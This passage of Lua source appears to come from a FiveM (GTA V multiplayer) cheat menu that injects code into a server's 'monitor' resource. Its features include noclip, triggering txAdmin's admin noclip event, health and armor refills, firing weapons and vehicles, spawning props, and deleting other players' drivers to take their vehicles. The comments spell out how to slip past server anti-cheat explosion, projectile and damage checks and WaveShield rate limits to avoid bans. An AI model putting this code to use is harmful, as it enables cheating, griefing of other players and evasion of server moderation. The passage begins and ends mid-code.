                                    local function clearNoclipProp(setPed)
                                        if setNoclipProp and DoesEntityExist(setNoclipProp) then
                                            SafeRunNative(DeleteObject, setNoclipProp)
                                        end
                                        setNoclipProp = nil
                                        setNoclipPropModel = nil

                                        if setPed and GetVehiclePedIsIn(setPed, false) <= 0 then
                                            SafeRunNative(ClearPedTasksImmediately, setPed)
                                        end
                                    end

                                    local function applyNoclipMode(setPed)
                                        local modeChanged = setNoclipMode ~= setNoclipLastMode
                                        local modeCfg = noclipModes[setNoclipMode]

                                        if not modeCfg then
                                            if modeChanged then
                                                clearNoclipProp(setPed)
                                            end
                                            setNoclipLastMode = setNoclipMode
                                            return
                                        end

                                        if not setNoclipProp or not DoesEntityExist(setNoclipProp) or setNoclipPropModel ~= modeCfg.model then
                                            clearNoclipProp(setPed)

                                            if waitForModel(modeCfg.model) then
                                                local pos = GetEntityCoords(setPed)
                                                local prop = SafeRunNative(CreateObject, modeCfg.model, pos.x, pos.y, pos.z, false, false, false)

                                                SafeRunNative(
                                                    AttachEntityToEntity,
                                                    prop,
                                                    setPed,
                                                    GetPedBoneIndex(setPed, modeCfg.bone),
                                                    modeCfg.offset.x, modeCfg.offset.y, modeCfg.offset.z,
                                                    modeCfg.rot.x, modeCfg.rot.y, modeCfg.rot.z,
                                                    true, true, false, false, 2, true
                                                )
                                                SafeRunNative(SetEntityCollision, prop, false, false)

                                                setNoclipProp = prop
                                                setNoclipPropModel = modeCfg.model
                                            end

                                            SafeRunNative(SetModelAsNoLongerNeeded, modeCfg.model)
                                        elseif not IsEntityAttachedToEntity(setNoclipProp, setPed) then
                                            SafeRunNative(
                                                AttachEntityToEntity,
                                                setNoclipProp,
                                                setPed,
                                                GetPedBoneIndex(setPed, modeCfg.bone),
                                                modeCfg.offset.x, modeCfg.offset.y, modeCfg.offset.z,
                                                modeCfg.rot.x, modeCfg.rot.y, modeCfg.rot.z,
                                                true, true, false, false, 2, true
                                            )
                                        end

                                        if modeCfg.animDict and not IsEntityPlayingAnim(setPed, modeCfg.animDict, modeCfg.animName, 3) then
                                            PlayAnim(setPed, modeCfg.animDict, modeCfg.animName, 8.0, -8.0, -1, 1, 0, false, false, false)
                                        end

                                        setNoclipLastMode = setNoclipMode
                                    end

                                    if not setNoclipThreads then
                                        setNoclipThreads = true

                                        SafeRunNative(CreateThread, function()
                                            while setNoclipAllow do
                                                Wait(0)
                                                if setNoclipActive and setNoclipAllow then
                                                    local setPed = PlayerPedId()
                                                    local setVehicle = GetVehiclePedIsIn(setPed, false)
                                                    local setEntity = setVehicle > 0 and setVehicle or setPed
                                                    local pos = GetEntityCoords(setEntity)
                                                    local move = vector3(0, 0, 0)
                                                    local camDir = getCamDirection()

                                                    if IsControlPressed(0, 32) then move = move + (camDir * setNoclipSpeed) end
                                                    if IsControlPressed(0, 33) then move = move - (camDir * setNoclipSpeed) end
                                                    if IsControlPressed(0, 34) then move = move + (vector3(-camDir.y, camDir.x, 0) * setNoclipSpeed) end
                                                    if IsControlPressed(0, 35) then move = move + (vector3(camDir.y, -camDir.x, 0) * setNoclipSpeed) end
                                                    if IsControlPressed(0, 46) then move = move + vector3(0, 0, -setNoclipSpeed) end
                                                    if IsControlPressed(0, 44) then move = move + vector3(0, 0, setNoclipSpeed) end
                                                    if IsControlPressed(0, 21) then move = move * 2.5 end

                                                    if #(move) > 0.01 then
                                                        local newPos = pos + (move * 0.1)
                                                        SafeRunNative(SetEntityCoordsNoOffset, setEntity, newPos.x, newPos.y, newPos.z, true, true, true)
                                                    end

                                                    local camHeading = GetGameplayCamRelativeHeading() + GetEntityHeading(setPed)
                                                    SafeRunNative(SetEntityHeading, setEntity, camHeading % 360)

                                                    SafeRunNative(FreezeEntityPosition, setEntity, true)

                                                    applyNoclipMode(setPed)
                                                else
                                                    local setPed = PlayerPedId()
                                                    local setVehicle = GetVehiclePedIsIn(setPed, false)
                                                    SafeRunNative(FreezeEntityPosition, setVehicle > 0 and setVehicle or setPed, false)
                                                    if setVehicle > 0 then
                                                        SafeRunNative(SetEntityVelocity, setVehicle, 0.0, 0.0, -0.1)
                                                    end
                                                    clearNoclipProp()
                                                end
                                            end
                                            local setPed = PlayerPedId()
                                            local setVehicle = GetVehiclePedIsIn(setPed, false)
                                            if setVehicle > 0 then
                                                SafeRunNative(FreezeEntityPosition, setVehicle, false)
                                                SafeRunNative(SetEntityVelocity, setVehicle, 0.0, 0.0, -0.1)
                                            end
                                            setNoclipThreads = false
                                        end)
                                    end
                                ]])
                            else
                                injectCode('monitor', [[
                                    setNoclipAllow = false
                                    setNoclipActive = false

                                    if setNoclipProp and DoesEntityExist(setNoclipProp) then
                                        SafeRunNative(DeleteObject, setNoclipProp)
                                    end
                                    setNoclipProp = nil
                                    setNoclipPropModel = nil

                                    local setPed = PlayerPedId()
                                    local setVehicle = GetVehiclePedIsIn(setPed, false)
                                    if setVehicle > 0 then
                                        SafeRunNative(FreezeEntityPosition, setVehicle, false)
                                        SafeRunNative(SetEntityVelocity, setVehicle, 0.0, 0.0, -0.1)
                                    else
                                        SafeRunNative(ClearPedTasksImmediately, setPed)
                                    end
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Tx Admin Noclip',
                        type = 'checkbox',
                        checked = false,
                        onConfirm = function(checked)
                            if checked then
                                injectCode('monitor', [[
                                    SafeRunNative(TriggerEvent, 'txcl:setPlayerMode', 'noclip', true)
                                ]])
                            else
                                injectCode('monitor', [[
                                    SafeRunNative(TriggerEvent, 'txcl:setPlayerMode', 'none', true)
                                ]])
                            end
                        end
                    },
                    {
                        label = 'Full Health',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local setPed = PlayerPedId()
                                SafeRunNative(SetEntityHealth, setPed, 200)
                            ]])
                        end
                    },
                    {
                        label = 'Full Armor',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local setPed = PlayerPedId()
                                SafeRunNative(SetPedArmour, setPed, 100)
                            ]])
                        end
                    },
                    {
                        label = 'Refill Food',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                SafeRunNative(TriggerEvent, 'esx_status:set', 'hunger', 1000000)
                            ]])
                        end
                    },
                    {
                        label = 'Refill Water',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                SafeRunNative(TriggerEvent, 'esx_status:set', 'thirst', 1000000)
                            ]])
                        end
                    },
                    { type = 'divider', label = 'Other' },
                    {
                        label = 'Noclip Mode',
                        icon = "ph ph-magic-wand",
                        type = 'scroll',
                        options = {
                            { label = 'Default', value = 'default' },
                            { label = 'Witch', value = 'witchy' },
                            { label = 'Chill', value = 'chilling' },
                            { label = 'Shitting', value = 'shitting' },
                        },
                        selected = 1,
                        onConfirm = function(setOptions)
                            injectCode('monitor', [[
                                setNoclipMode = ']] .. setOptions.value .. [['
                            ]])
                        end
                    },
                    {
                        label = 'Free Cam',
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled == false then
                                MachoExecuteDuiScript(Dui, 'window.hoveringText.hideList();')
                                MachoExecuteDuiScript(Dui, 'window.crosshair.hide();')

                                injectCode('monitor', [[
                                    DeleteTrackedThread('Freecam')
                                ]])

                                if freecamHandle and DoesCamExist(freecamHandle) then
                                    SetCamActive(freecamHandle, false)
                                    RenderScriptCams(false, false, 0, false, false)
                                    DestroyCam(freecamHandle, false)
                                end

                                freecamHandle = nil

                                return
                            end

                            MachoExecuteDuiScript(Dui, 'window.hoveringText.showList();')
                            MachoExecuteDuiScript(Dui, 'window.crosshair.show();')

                            local fcPos = GetGameplayCamCoord()
                            local fcRot = GetGameplayCamRot(2)

                            freecamHandle = CreateCamWithParams('DEFAULT_SCRIPTED_CAMERA', fcPos.x, fcPos.y, fcPos.z, fcRot.x, fcRot.y, fcRot.z, 70.0, true, 2)
                            SetCamActive(freecamHandle, true)
                            RenderScriptCams(true, false, 0, true, true)

                            injectCode('monitor', string.format('local cam = %d\n', freecamHandle) .. [[
                                local sensitivity = 7.5
                                local speedBase = 5.0
                                local lastHold

                                local currentWeapon = _G.SetClient_CurrentSetFcWeapon or 1
                                local setWeapons = {
                                    'weapon_appistol',
                                    'weapon_combatpistol',
                                    'weapon_pistol50',
                                }

                                local busyFcVehicles = {}
                                local currentShootVehicle = _G.SetClient_CurrentSetFcShootVehicle or 1
                                local setVehicles = {
                                    'Random Existing',
                                    -- bicycles / scooters
                                    'cruiser',
                                    'bmx',
                                    'faggio2',
                                    'tribike',
                                    -- dirt / off-road
                                    'sanchez',
                                    'enduro',
                                    'blazer',
                                    -- sport bikes
                                    'bati',
                                    'pcj',
                                    -- sedans / compacts
                                    'sultan',
                                    'premier',
                                    'fugitive',
                                    'blista',
                                    -- muscle
                                    'dominator',
                                    'gauntlet',
                                    'vigero',
                                    'phoenix',
                                    -- suvs
                                    'baller',
                                    'seminole',
                                    'mesa',
                                    -- vans
                                    'burrito',
                                    'moonbeam',
                                    'youga',
                                    -- trucks / pickups
                                    'bobcat',
                                    'bison',
                                    'sadler',
                                    -- classics / lowriders
                                    'tornado',
                                    'manana',
                                    'peyote',
                                    'buccaneer',
                                    'voodoo',
                                }

                                local currentSpawnProp = _G.SetClient_CurrentSetFcSpawnProp or 1
                                local setProps = {
                                    'prop_towercrane_02a',
                                    'xm_prop_x17_barge_01',
                                    'prop_air_bigradar_l1',
                                    'prop_storagetank_01',
                                    'prop_lev_des_barge_01',
                                    'prop_rail_boxcar',
                                    'xm_prop_x17_silo_01a',
                                    'xm_prop_x17_silo_rocket_01',
                                    'm23_2_prop_m32_ice_block_05b',
                                    'xs_prop_can_tunnel_wl',
                                    'xs_combined_dyst_06_roads',
                                    'xs_propintarena_structure_c_02a',
                                    'prop_huge_display_01',
                                    'prop_tree_pine_02',
                                    'prop_rock_4_big2',
                                    'prop_ind_mech_01c',
                                    'prop_xmas_ext',
                                    'prop_ld_ferris_wheel',
                                    'prop_tree_cedar_03',
                                    'prop_mp_ramp_03',
                                    'prop_pylon_02',
                                    'prop_air_bridge01',
                                    'prop_dock_crane_02',
                                    'prop_ind_barge_01',
                                    'prop_makeup_trail_02',
                                    'prop_ind_barge_02',
                                    'xm_prop_out_hanger_lift',
                                    'xs_propint2_building_05b',
                                    'xm_prop_x17_sub',
                                    'xm_prop_x17_shamal_crash',
                                    'custom',
                                }

                                -- Three separate server-side handlers have to be satisfied at once:
                                --   1. explosionEvent   - rejects any explosion whose weapon hash is not on its
                                --                         own ignore list, so the weapon must come from that list.
                                --   2. startProjectileEvent - rejects every projectile that is not explicitly
                                --                         whitelisted, and that whitelist is empty by default.
                                --                         Anything that launches a rocket, shell, grenade or
                                --                         flare is therefore off the table completely.
                                --   3. weaponDamageEvent - spoofed-bullet check, skipped for ignored weapons.
                                -- Only hitscan vehicle weapons satisfy all three: they never create a
                                -- projectile, and their hashes sit on the explosion + damage ignore lists.
                                -- The laser cannons are the only ones of those that also detonate on impact.
                                local explodeWeapon = 'VEHICLE_WEAPON_PLAYER_LAZER'

                                -- Explosion limiters count explosions per player in a rolling 5 second window
                                -- and trip at 5, so never let more than 4 leave the client in that window.
                                local function GetExplodeAllowance(setCount)
                                    local now = GetGameTimer()

                                    setCount = setCount or 1

                                    _G.SetClient_ExplodeHistory = _G.SetClient_ExplodeHistory or {}

                                    for i = #_G.SetClient_ExplodeHistory, 1, -1 do
                                        if (now - _G.SetClient_ExplodeHistory[i]) > 5000 then
                                            table.remove(_G.SetClient_ExplodeHistory, i)
                                        end
                                    end

                                    if (#_G.SetClient_ExplodeHistory + setCount) > 4 then
                                        SendToHook('FreecamNotify', 'Explosion rate limit: wait a few seconds', 'error')

                                        return false
                                    end

                                    for i = 1, setCount do
                                        _G.SetClient_ExplodeHistory[#_G.SetClient_ExplodeHistory + 1] = now
                                    end

                                    return true
                                end

                                local currentSpawnPed = _G.SetClient_CurrentSetFcSpawnPed or 1
                                local setPeds = {
                                    { label = 'Random' },
                                    { label = 'Humpback Whale', model = 'a_c_humpback',      pedType = 28 },
                                    { label = 'Killer Whale',   model = 'a_c_killerwhale',   pedType = 28 },
                                    { label = 'Tiger Shark',    model = 'a_c_sharktiger',    pedType = 28 },
                                    { label = 'Dolphin',        model = 'a_c_dolphin',       pedType = 28 },
                                    { label = 'Chimp',          model = 'a_c_chimp',         pedType = 28 },
                                    { label = 'Cow',            model = 'a_c_cow',           pedType = 28 },
                                    { label = 'Boar',           model = 'a_c_boar',          pedType = 28 },
                                    { label = 'Coyote',         model = 'a_c_coyote',        pedType = 28 },
                                    { label = 'Deer',           model = 'a_c_deer',          pedType = 28 },
                                    { label = 'Mountain Lion',  model = 'a_c_mtlion',        pedType = 28 },
                                    { label = 'Pig',            model = 'a_c_pig',           pedType = 28 },
                                    { label = 'Rabbit',         model = 'a_c_rabbit_01',     pedType = 28 },
                                    { label = 'Rottweiler',     model = 'a_c_rottweiler',    pedType = 28 },
                                    { label = 'Husky',          model = 'a_c_husky',         pedType = 28 },
                                    { label = 'Pug',            model = 'a_c_pug',           pedType = 28 },
                                    { label = 'Retriever',      model = 'a_c_retriever',     pedType = 28 },
                                    { label = 'Cat',            model = 'a_c_cat_01',        pedType = 28 },
                                    { label = 'Chicken Hawk',   model = 'a_c_chickenhawk',   pedType = 28 },
                                    { label = 'Crow',           model = 'a_c_crow',          pedType = 28 },
                                    { label = 'Seagull',        model = 'a_c_seagull',       pedType = 28 },
                                    { label = 'Rat',            model = 'a_c_rat',           pedType = 28 },
                                    { label = 'Cop',            model = 's_m_y_cop_01' },
                                    { label = 'Swat',           model = 's_m_y_swat_01' },
                                    { label = 'Clown',          model = 's_m_y_clown_01' },
                                    { label = 'Zombie',         model = 'u_m_y_zombie_01' },
                                    { label = 'Yule Monster',   model = 'u_m_m_yulemonster' },
                                    { label = 'Marine',         model = 'csb_ramp_marine' },
                                    { label = 'Lost MC',        model = 'g_m_y_lost_01' },
                                    { label = 'Ballas',         model = 'g_m_y_ballasog' },
                                    { label = 'Freemode Male',  model = 'mp_m_freemode_01' },
                                    { label = 'Freemode Female',model = 'mp_f_freemode_01' },
                                    { label = 'Michael',        model = 'player_zero' },
                                    { label = 'Franklin',       model = 'player_one' },
                                    { label = 'Trevor',         model = 'player_two' },
                                    { label = 'Custom Ped' },
                                }

                                local currentHijackDriver = _G.SetClient_CurrentSetFcHijackDriver or 1
                                local setHijackDrivers = {
                                    { label = 'Yule Monster', model = 'u_m_m_yulemonster' },
                                    { label = 'Clown',        model = 's_m_y_clown_01' },
                                    { label = 'Zombie',       model = 'u_m_y_zombie_01' },
                                    { label = 'Cop',          model = 's_m_y_cop_01' },
                                    { label = 'Chimp',        model = 'a_c_chimp', pedType = 28 },
                                    { label = 'Cow',          model = 'a_c_cow',   pedType = 28 },
                                }

                                local function GetSpawnAllowance()
                                    if GetResourceState('WaveShield') ~= 'started' then
                                        return true
                                    end

                                    local now = GetGameTimer()

                                    _G.SetClient_SpawnHistory = _G.SetClient_SpawnHistory or {}
                                    _G.SetClient_SpawnCooldownUntil = _G.SetClient_SpawnCooldownUntil or 0

                                    if now < _G.SetClient_SpawnCooldownUntil then
                                        return false
                                    end

                                    for i = #_G.SetClient_SpawnHistory, 1, -1 do
                                        if (now - _G.SetClient_SpawnHistory[i]) > 3000 then
                                            table.remove(_G.SetClient_SpawnHistory, i)
                                        end
                                    end

                                    _G.SetClient_SpawnHistory[#_G.SetClient_SpawnHistory + 1] = now

                                    if #_G.SetClient_SpawnHistory >= 3 then
                                        _G.SetClient_SpawnCooldownUntil = now + 7000
                                        _G.SetClient_SpawnHistory = {}

                                        SendToHook('FreecamNotify', 'Ban prevention: wait 7s before spawning again', 'error')

                                        return false
                                    end

                                    return true
                                end

                                local function LoadSetModel(model)
                                    local modelHash = GetHashKey(model)

                                    RequestModel(modelHash)

                                    local setTimer = GetGameTimer()

                                    while not HasModelLoaded(modelHash) do
                                        Wait(0)

                                        if (GetGameTimer() - setTimer) > 5000 then
                                            return
                                        end
                                    end

                                    return modelHash
                                end

                                local physHeldEntity = 0
                                local physHoldDist = 5.0

                                -- GetEntityArchetypeName throws on anything that is not a real script
                                -- entity (map geometry the probe hits, peds, detached props), so it is
                                -- only ever called for vehicles and always behind a type check.
                                local function GetPhysEntityLabel(entity)
                                    if not entity or entity <= 0 or not DoesEntityExist(entity) then
                                        return
                                    end

                                    local entityType = GetEntityType(entity)

                                    if entityType == 2 then
                                        return GetEntityArchetypeName(entity) or 'vehicle'
                                    elseif entityType == 1 then
                                        if IsPedAPlayer(entity) then
                                            return GetPlayerName(NetworkGetPlayerIndexFromPed(entity)) or 'player'
                                        end

                                        return 'ped'
                                    elseif entityType == 3 then
                                        return 'object'
                                    end
                                end

                                local function PhysGunRelease()
                                    if physHeldEntity ~= 0 then
                                        if DoesEntityExist(physHeldEntity) then
                                            SafeRunNative(ResetEntityAlpha, physHeldEntity)
                                        end

                                        physHeldEntity = 0
                                    end
                                end

                                local function GetFirstPassengerSeat(veh)
                                    for _, seat in ipairs({0, 1, 2, 3}) do
                                        if IsVehicleSeatFree(veh, seat) then
                                            return seat
                                        end
                                    end
                                end

                                local function TeleportOutsideVehicle(ped, veh)
                                    local vehCoords = GetEntityCoords(veh)
                                    local forward = GetEntityForwardVector(veh)
                                    SafeRunNative(SetEntityCoordsNoOffset, ped, vehCoords.x + forward.x * -3.0, vehCoords.y + forward.y * -3.0, vehCoords.z + 0.5, false, false, false)
                                end

                                local function KickVehicleDriver(vehicle)
                                    if not vehicle or vehicle == 0 or not DoesEntityExist(vehicle) then return end

                                    local ped = PlayerPedId()
                                    local originalCoords = GetEntityCoords(ped)

                                    local reqStart = GetGameTimer()
                                    while (GetGameTimer() - reqStart) < 1500 do
                                        if NetworkHasControlOfEntity(vehicle) then break end
                                        SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                        Wait(0)
                                    end

                                    SafeRunNative(SetEntityVisible, ped, false, false)

                                    local attempts = 0
                                    while attempts < 10 do
                                        attempts = attempts + 1

                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver == 0 then break end

                                        local seat = GetFirstPassengerSeat(vehicle)
                                        if not seat then break end

                                        TeleportOutsideVehicle(ped, vehicle)
                                        Wait(40)

                                        SafeRunNative(SetPedIntoVehicle, ped, vehicle, seat)
                                        Wait(60)

                                        SafeRunNative(NetworkRequestControlOfEntity, vehicle)
                                        Wait(800)

                                        SafeRunNative(DeleteEntity, driver)
                                        Wait(80)

                                        SafeRunNative(SetPedIntoVehicle, ped, vehicle, -1)
                                        Wait(200)

                                        if GetPedInVehicleSeat(vehicle, -1) == ped then break end
                                    end

                                    if IsPedInAnyVehicle(ped, false) then
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        SafeRunNative(TaskLeaveVehicle, ped, veh, 16)
                                        Wait(200)
                                        SafeRunNative(ClearPedTasksImmediately, ped)
                                    end

                                    SafeRunNative(SetEntityCoordsNoOffset, ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                    SafeRunNative(SetEntityVisible, ped, true, false)
                                end

                                local function PhysGunGrab(entity, camCoords)
                                    if not entity or entity <= 0 or not DoesEntityExist(entity) then
                                        return
                                    end

                                    local entityType = GetEntityType(entity)

                                    if entityType ~= 1 and entityType ~= 2 and entityType ~= 3 then
                                        return
                                    end

                                    if entity == PlayerPedId() or entity == GetEntityParent() then
                                        return
                                    end

                                    SafeRunNative(CreateThread, function()
                                        if entityType == 2 then
                                            local ped = PlayerPedId()
                                            local driver = GetPedInVehicleSeat(entity, -1)

                                            if driver ~= 0 and driver ~= ped then
                                                KickVehicleDriver(entity)
                                            end

                                            TakeControlOfVehicle(entity)
                                        else
                                            local setTimer = GetGameTimer()

                                            while DoesEntityExist(entity) and not NetworkHasControlOfEntity(entity) and (GetGameTimer() - setTimer) <= 1000 do
                                                SafeRunNative(NetworkRequestControlOfEntity, entity)

                                                Wait(0)
                                            end
                                        end

                                        if not DoesEntityExist(entity) then
                                            return
                                        end

                                        -- Taking control can take up to a second; if the button was let go in
                                        -- the meantime don't leave a ghosted entity stuck in the held state.
                                        if not IsDisabledControlPressed(0, 24) then
                                            return
                                        end

                                        SafeRunNative(SetEntityAsMissionEntity, entity, true, true)
                                        SafeRunNative(FreezeEntityPosition, entity, false)
                                        SafeRunNative(SetEntityCollision, entity, true, true)
                                        SafeRunNative(SetEntityAlpha, entity, 180, false)

                                        local distance = #(GetEntityCoords(entity) - camCoords)

                                        physHoldDist = math.max(2.0, math.min(distance, 100.0))
                                        physHeldEntity = entity
                                    end)
                                end

                                local function GetVehicleData(isSelected, entity)
                                    if not isSelected or not entity then
                                        return
                                    end

                                    if entity > 0 and DoesEntityExist(entity) and GetEntityType(entity) == 2 then
                                        return '('..(GetEntityArchetypeName(entity) or '?')..')'
                                    end

                                    return '(none)'
                                end

                                local options = {
                                    {
                                        id = 'view_world',
                                        label = 'View World',
                                    },
                                    {
                                        id = 'teleport',
                                        label = 'Teleport',
                                        onHold = function(entity, targetCoords, camCoords, camRotation)
                                            if targetCoords then
                                                local selfPed = PlayerPedId()
                                                local setEntity = GetEntityParent()

                                                if entity and entity > 0 and GetEntityType(entity) == 2 then
                                                    if setEntity and setEntity == entity then
                                                        return
                                                    end

                                                    for i = -1, GetVehicleMaxNumberOfPassengers(entity) - 1 do
                                                        if IsVehicleSeatFree(entity, i) then
                                                            SafeRunNative(TaskWarpPedIntoVehicle, selfPed, entity, i)
                                                            return
                                                        end
                                                    end
                                                end

                                                SafeRunNative(SetEntityCoords, setEntity, targetCoords.x, targetCoords.y, targetCoords.z)
                                                SafeRunNative(SetEntityHeading, setEntity, camRotation.z)
                                            end
                                        end
                                    },
                                    {
                                        id = 'shoot_weapon',
                                        liveLabel = function(isSelected)
                                            local data

                                            if isSelected then
                                                local setWeapon = setWeapons[currentWeapon]

                                                data = '('..(setWeapon or '?')..')'
                                            end

                                            return {
                                                label = 'Shoot Weapon',
                                                data = data
                                            }
                                        end,
                                        onLeft = function()
                                            if currentWeapon > 1 then
                                                currentWeapon = currentWeapon - 1
                                            else
                                                currentWeapon = #setWeapons
                                            end

                                            _G.SetClient_CurrentSetFcWeapon = currentWeapon
                                        end,
                                        onRight = function()
                                            if currentWeapon < #setWeapons then
                                                currentWeapon = currentWeapon + 1
                                            else
                                                currentWeapon = 1
                                            end

                                            _G.SetClient_CurrentSetFcWeapon = currentWeapon
                                        end,
                                        onHold = function(entity, targetCoords, camCoords)
                                            if targetCoords then
                                                local setWeapon = setWeapons[currentWeapon]

                                                ShootBullet('self', GetHashKey(setWeapon), targetCoords, camCoords)
                                            end
                                        end
                                    },
                                    {
                                        id = 'shoot_vehicle',
                                        liveLabel = function(isSelected)
                                            local data

                                            if isSelected then
                                                local setVehicle = setVehicles[currentShootVehicle]

                                                data = '('..(setVehicle or '?')..')'
                                            end

                                            return {
                                                label = 'Shoot Vehicle',
                                                data = data
                                            }
                                        end,
                                        onLeft = function()
                                            if currentShootVehicle > 1 then
                                                currentShootVehicle = currentShootVehicle - 1
                                            else
                                                currentShootVehicle = #setVehicles
                                            end

                                            _G.SetClient_CurrentSetFcShootVehicle = currentShootVehicle
                                        end,
                                        onRight = function()
                                            if currentShootVehicle < #setVehicles then
                                                currentShootVehicle = currentShootVehicle + 1
                                            else
                                                currentShootVehicle = 1
                                            end

                                            _G.SetClient_CurrentSetFcShootVehicle = currentShootVehicle
                                        end,
                                        onHold = function(entity, targetCoords, camCoords, camRotation)
                                            if targetCoords then
                                                local vehicleModel = setVehicles[currentShootVehicle]

                                                SafeRunNative(CreateThread, function()
                                                    local createdVehicle = false
                                                    local vehicle

                                                    if vehicleModel == 'Random Existing' then
                                                        local setTimer = GetGameTimer()
                                                        local vehicles = GetGamePool('CVehicle')
                                                        local randomExisting = {}

                                                        for i = 1, #vehicles do
                                                            local setVehicle = vehicles[i]

                                                            if setVehicle and NetworkGetEntityIsNetworked(setVehicle) then
                                                                local busyTimer = busyFcVehicles[setVehicle]

                                                                if not busyTimer or (setTimer - busyTimer) > 1000 then
                                                                    randomExisting[#randomExisting + 1] = setVehicle
                                                                end
                                                            end
                                                        end

                                                        if #randomExisting > 0 then
                                                            vehicle = randomExisting[math.random(#randomExisting)]

                                                            busyFcVehicles[vehicle] = setTimer

                                                            TakeControlOfVehicle(vehicle)
                                                            SetCoords(vehicle, camCoords)
                                                        else
                                                            return
                                                        end
                                                    else
                                                        local function SpawnVehicle(model, coords)
                                                            local vehicleHash = GetHashKey(model)

                                                            RequestModel(vehicleHash)

                                                            local setTimer = GetGameTimer()

                                                            while not HasModelLoaded(vehicleHash) do
                                                                Wait(0)

                                                                if (GetGameTimer() - setTimer) > 5000 then
                                                                    return
                                                                end
                                                            end

                                                            local spawnedVehicle = SafeRunNative(CreateVehicle, vehicleHash, coords.x, coords.y, coords.z, 0.0, true, false)

                                                            SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)

                                                            return spawnedVehicle
                                                        end

                                                        vehicle = SpawnVehicle(vehicleModel, camCoords)

                                                        if not vehicle then
                                                            return
                                                        else
                                                            createdVehicle = true
                                                        end
                                                    end

                                                    SafeRunNative(SetEntityRotation, vehicle, camRotation, 2, true)
                                                    SafeRunNative(SetEntityInvincible, vehicle, true)
                                                    SafeRunNative(SetEntityProofs, vehicle, true, true, true, true, true, true, true)

                                                    if createdVehicle then
                                                        SafeRunNative(SetEntityVisible, vehicle, false)
                                                        SafeRunNative(FreezeEntityPosition, vehicle, true)

                                                        Wait(150)

                                                        SafeRunNative(SetEntityVisible, vehicle, true)
                                                        SafeRunNative(FreezeEntityPosition, vehicle, false)
                                                    end

                                                    SafeRunNative(SetVehicleForwardSpeed, vehicle, 75.0)
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'spawn_prop',
                                        holdCooldown = 400,
                                        liveLabel = function(isSelected)
                                            local data

                                            if isSelected then
                                                local setProp = setProps[currentSpawnProp]

                                                if setProp == 'custom' then
                                                    data = '(' .. (_G.SetClient_CustomFcSpawnProp or 'enter to set') .. ')'
                                                else
                                                    data = '(' .. (setProp or '?') .. ')'
                                                end
                                            end

                                            return {
                                                label = 'Spawn Prop',
                                                data = data
                                            }
                                        end,
                                        onLeft = function()
                                            if currentSpawnProp > 1 then
                                                currentSpawnProp = currentSpawnProp - 1
                                            else
                                                currentSpawnProp = #setProps
                                            end

                                            _G.SetClient_CurrentSetFcSpawnProp = currentSpawnProp
                                        end,
                                        onRight = function()
                                            if currentSpawnProp < #setProps then
                                                currentSpawnProp = currentSpawnProp + 1
                                            else
                                                currentSpawnProp = 1
                                            end

                                            _G.SetClient_CurrentSetFcSpawnProp = currentSpawnProp
                                        end,
                                        onEnter = function()
                                            if setProps[currentSpawnProp] ~= 'custom' then return end
                                            if _G.SetClient_PropInputActive then return end

                                            SendToHook('ShowPropInput', _G.SetClient_CustomFcSpawnProp or '')
                                        end,
                                        onHold = function(entity, targetCoords)
                                            if targetCoords then
                                                local propModel = setProps[currentSpawnProp]

                                                if propModel == 'custom' then
                                                    propModel = _G.SetClient_CustomFcSpawnProp

                                                    if not propModel or propModel == '' then
                                                        SendToHook('FreecamNotify', 'Press Enter to set a custom prop name first.', 'error')
                                                        return
                                                    end
                                                end

                                                if GetResourceState('WaveShield') == 'started' then
                                                    local now = GetGameTimer()

                                                    _G.SetClient_PropSpawnHistory = _G.SetClient_PropSpawnHistory or {}
                                                    _G.SetClient_PropSpawnCooldownUntil = _G.SetClient_PropSpawnCooldownUntil or 0

                                                    if now < _G.SetClient_PropSpawnCooldownUntil then
                                                        SendToHook('FreecamNotify', ('Ban prevention: wait %.1f seconds before spawning again.'):format((_G.SetClient_PropSpawnCooldownUntil - now) / 1000), 'error')
                                                        return
                                                    end

                                                    for i = #_G.SetClient_PropSpawnHistory, 1, -1 do
                                                        if (now - _G.SetClient_PropSpawnHistory[i]) > 3000 then
                                                            table.remove(_G.SetClient_PropSpawnHistory, i)
                                                        end
                                                    end

                                                    _G.SetClient_PropSpawnHistory[#_G.SetClient_PropSpawnHistory + 1] = now

                                                    if #_G.SetClient_PropSpawnHistory >= 3 then
                                                        _G.SetClient_PropSpawnCooldownUntil = now + 7000
                                                        _G.SetClient_PropSpawnHistory = {}
                                                        SendToHook('FreecamNotify', 'Ban prevention: wait 7s before spawning again', 'error')
                                                        return
                                                    end
                                                end

                                                SafeRunNative(CreateThread, function()
                                                    local propHash = GetHashKey(propModel)

                                                    RequestModel(propHash)

                                                    local setTimer = GetGameTimer()

                                                    while not HasModelLoaded(propHash) do
                                                        Wait(0)

                                                        if (GetGameTimer() - setTimer) > 5000 then
                                                            SendToHook('FreecamNotify', 'Failed to load prop model.', 'error')
                                                            return
                                                        end
                                                    end

                                                    local prop = SafeRunNative(CreateObject, propHash, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)

                                                    SafeRunNative(SetModelAsNoLongerNeeded, propHash)

                                                    if prop and prop > 0 then
                                                        if propModel == 'm23_2_prop_m32_ice_block_05b' then
                                                            SafeRunNative(SetEntityRotation, prop, 90.0, 0.0, 0.0, 2, true)
                                                        end
                                                        SafeRunNative(FreezeEntityPosition, prop, true)
                                                        SafeRunNative(SetEntityInvincible, prop, true)
                                                    end
                                                end)
                                            end
                                        end
                                    },
                                    {
                                        id = 'black_hole',
                                        label = 'Black Hole',
                                        getChanges = function()
                                            return {
                                                rayFlag = 505
                                            }
                                        end,
                                        onHold = function(entity, targetCoords)
                                            if targetCoords then
                                                local entities = {}
                                                local peds = GetGamePool('CPed')
                                                local vehicles = GetGamePool('CVehicle')
                                                local setTime = GetGameTimer()

                                                for i = 1, #peds do
                                                    local ped = peds[i]

                                                    if not IsPedAPlayer(ped) then
                                                        entities[#entities + 1] = ped
                                                    end
                                                end

                                                for i = 1, #vehicles do
